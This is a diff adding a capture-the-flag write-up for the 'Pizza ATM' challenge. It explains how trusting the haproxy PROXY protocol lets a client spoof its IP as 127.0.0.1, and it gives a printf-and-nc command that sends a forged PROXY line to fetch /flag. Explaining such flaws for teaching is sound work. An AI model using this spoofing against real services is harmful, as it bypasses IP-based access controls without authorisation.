@@ -1,0 +1,25 @@
+---
+title: Pizza ATM
+---
+
+## Description
+On a 3AM quest for food you stumble upon a magical vending machine cooking the freshest pizzas. You play around with the screen and find out a strange terminal. Can you manage to order your favorite Pizza Bandierina?
+
+## Solution
+
+With HTTP you have the `X-Remote-Addr` header that is set by reverse proxies to indicate the original/real IP address of the client. This is well-known to be exploit-able, because any client can set this header (when making a request directly to the application). Therefore, many applications only read from this header when it's known that there is a reverse proxy in front of the application.
+
+This challenge is really similar in that sense, however, instead of using HTTP it uses the proxy protocol (haproxy). Similar to spoofing the HTTP header, we can just set our client IP to be `127.0.0.1` and read `/flag`, which in this challenge, would obtain the flag.
+
+`127.0.0.1` -> client IP (must match 127.0.0.1 otherwise we get access denied)
+`1.1.1.1` -> destination IP (does not matter)
+`54321` -> client PORT (does not matter)
+`5003` -> destination port (should be 5003 as per challenge config, this is the port the vulnerable webserver is listening on)
+
+```bash
+printf "PROXY TCP4 127.0.0.1 1.1.1.1 54321 5003\r\n\
+GET /flag HTTP/1.1\r\n\
+Host: DOMAIN:PORT\r\n\
+\r\n" \
+| nc DOMAIN PORT
+```
